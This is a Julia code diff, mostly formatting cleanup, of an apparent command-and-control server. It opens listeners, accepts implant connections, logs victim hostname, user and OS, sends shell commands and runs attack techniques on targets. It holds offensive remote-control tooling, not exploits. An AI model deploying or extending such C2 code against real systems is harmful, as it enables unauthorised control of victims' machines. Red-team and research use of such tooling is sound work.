@@ -3,16 +3,16 @@ using Sockets
 using Base64
 
 
-Base.@kwdef struct Session <: AbstractSession 
+Base.@kwdef struct Session <: AbstractSession
     id::AbstractString = string(uuid4())
     commands::Channel = Channel{String}(32)
-    results::Channel = Channel{Tuple{String, String}}(32)
+    results::Channel = Channel{Tuple{String,String}}(32)
     compressResults::Bool = true
 end
 
 Base.@kwdef mutable struct C2
-    listeners::Dict{AbstractString, Task} = Dict()
-    sessions::Dict{AbstractString, Session} = Dict()
+    listeners::Dict{AbstractString,Task} = Dict()
+    sessions::Dict{AbstractString,Session} = Dict()
 end
 
 
@@ -22,7 +22,7 @@ function sendCommand(conn, cmd::String, compress::Bool=true)
         cmd = cmd * " | base64 -w 0; echo ''" # also need to drop the standard newlines after 76 chars
     end
 
-    @info " 📥 sending '$cmd'" 
+    @info " 📥 sending '$cmd'"
     write(conn, "$cmd\n")
     # response = readline(conn) # works only for single line responses
     # this is considered bad practice, maybe find a better alternative 
@@ -42,7 +42,7 @@ function sendCommand(conn, cmd::String, compress::Bool=true)
     return response
 end
 
-function handleNewImplant(conn, bus :: MessageBus, listenerId::String,  c2::C2)
+function handleNewImplant(conn, bus::MessageBus, listenerId::String, c2::C2)
     session = Session()
     c2.sessions[session.id] = session
 
@@ -53,7 +53,7 @@ function handleNewImplant(conn, bus :: MessageBus, listenerId::String,  c2::C2)
     publish!(bus, SessionStarted(id=session.id, listenerId=listenerId, hostname=hostname, user=user, os=os))
     # active lifetime of the implant
     # TODO: handle external session disconnect
-        # maybe send periodic pings to session, if it's a simple shell?
+    # maybe send periodic pings to session, if it's a simple shell?
     for cmd in session.commands
         # println(" >>>> 🫡 Command: $cmd")
         res = sendCommand(conn, cmd, session.compressResults)
@@ -65,7 +65,7 @@ function handleNewImplant(conn, bus :: MessageBus, listenerId::String,  c2::C2)
     publish!(bus, SessionEnded(session.id))
 end
 
-function inferOS(os::AbstractString) :: AbstractString
+function inferOS(os::AbstractString)::AbstractString
     os = lowercase(os)
     if contains(os, "darwin")
         return "macOS"
@@ -78,16 +78,16 @@ function inferOS(os::AbstractString) :: AbstractString
 end
 
 
-function startListener(ev::StartListener, bus:: MessageBus, c2::C2)
+function startListener(ev::StartListener, bus::MessageBus, c2::C2)
     listenerId = string(uuid4())
     @info "Start C2 listener ($listenerId) on port $(ev.port)"
 
     # HTTP.serve!(handleNewImplant, "0.0.0.0",ev.port; async=true)
-    listenerTask = errormonitor(@async begin
+    listenerTask = errormonitor(Threads.@spawn begin
         server = Sockets.listen(ip"0.0.0.0", ev.port)
         while true # TODO maybe create Event to stop  here and return the event as result event from this fn, so the event can be set somewhere else
             sock = Sockets.accept(server)
-            errormonitor(@async handleNewImplant(sock, bus, listenerId, c2))
+            errormonitor(Threads.@spawn handleNewImplant(sock, bus, listenerId, c2))
         end
         @warn "Listener stopped"
     end)
@@ -96,7 +96,7 @@ function startListener(ev::StartListener, bus:: MessageBus, c2::C2)
     return ListenerReady(listenerId, ev.port, "tcp", listenerTask)
 end
 
-function onStopListener(ev::StopListener, channel:: Channel, c2::C2)
+function onStopListener(ev::StopListener, channel::Channel, c2::C2)
     listener = get(c2.listeners, ev.listenerId, nothing)
     if isnothing(listener)
         # TODO stop listener
@@ -123,8 +123,8 @@ function executeActionOnTarget(ev::ExecuteActionOnTarget, c2::C2)
     # TODO implement error handling if command is not possible
     # TODO get the TTP from the armory
     # TODO attempt dependency injection for the various TTPs depending on their signature .. maybe with `methods` function
-        # println("Signature of function: ")
-        # println(methods(ev.ttp.action))
+    # println("Signature of function: ")
+    # println(methods(ev.ttp.action))
 
     if isa(ev.ttp.action, Function)
         result = ev.ttp.action(session, ev.target)
@@ -141,13 +141,13 @@ function executeActionOnTarget(ev::ExecuteActionOnTarget, c2::C2)
         return ActionExecuted(sessionId=session.id, actionId=ev.ttp.id, target=ev.target), result
     else
         return ActionExecuted(sessionId=session.id, actionId=ev.ttp.id, target=ev.target, output=result)
-    end 
+    end
 
 end
 
 
 
-function startC2(bus:: MessageBus)
+function startC2(bus::MessageBus)
     # start out with one listener out of the box
 
     c2 = C2()
@@ -159,4 +159,4 @@ function startC2(bus:: MessageBus)
     register!(bus, ExecuteActionOnTarget, (ev) -> executeActionOnTarget(ev, c2))
 
     register!(bus, SessionEnded, (ev) -> onSessionEnded(ev, c2))
-end 
+end
